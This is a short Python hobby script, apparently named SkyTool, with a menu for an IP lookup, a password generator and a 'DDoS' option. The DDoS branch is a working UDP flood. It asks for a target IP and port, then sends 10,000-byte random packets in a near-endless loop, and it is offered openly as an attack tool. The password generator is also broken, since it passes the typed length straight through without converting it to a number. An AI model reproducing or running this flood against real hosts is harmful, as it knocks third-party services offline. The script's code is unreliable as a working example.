import requests
import json
import os
import sys
import socket
import random
import pyautogui
import random
import colorama
import socket, random, time
from pathlib import Path

from colorama import Fore, Back, Style

print ("###############################################################################")
print ("                                                                               ")
print ("    				create by SkypeG                                           ")
print ("    								                                           ")
print ("   				   SkyTool                                                     ")
print ("                                   V1.0                                        ")
print ("                                                                               ")
print ("  https://github.com/SkypeG                                                    ")
print ("  https://www.youtube.com/@Skype112G/featured			                       ")
print ("###############################################################################")

host = socket.gethostname()

selection = input(host + "@Skytool :")

if selection=="help":
    print("""
    MYIP : For Checking Your IP
    PWGEN : For Generate Secure Password
    DDoS : DDoS Tool
   """)

if selection=="credits":
    print("""
    Create By Sky Inc.
    Programmed By Sky Inc.
    """)

if selection=="myip":
    host = socket.gethostname()
    print("Device Name :", host)

    ip = socket.gethostbyname(host)
    print("Ip :",ip)

if selection=="pwgen":
    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    number = "0123456789"
    symbols = "!@#$%^&*()."

    string = lower + upper + number + symbols
    lenght = input("Input The PW Lenght :")
    pwgen = "".join(random.sample(string,lenght))

    print("The Password Is :" + pwgen)

if selection=="DDoS":
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = input("Enter Target IP: ")
    port = int(input("Enter Target Port: "))
    sleep = float(input("Sleep: "))
 
    s.connect((ip, port))
 
    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Send: {i}", end='\r')
        time.sleep(sleep)
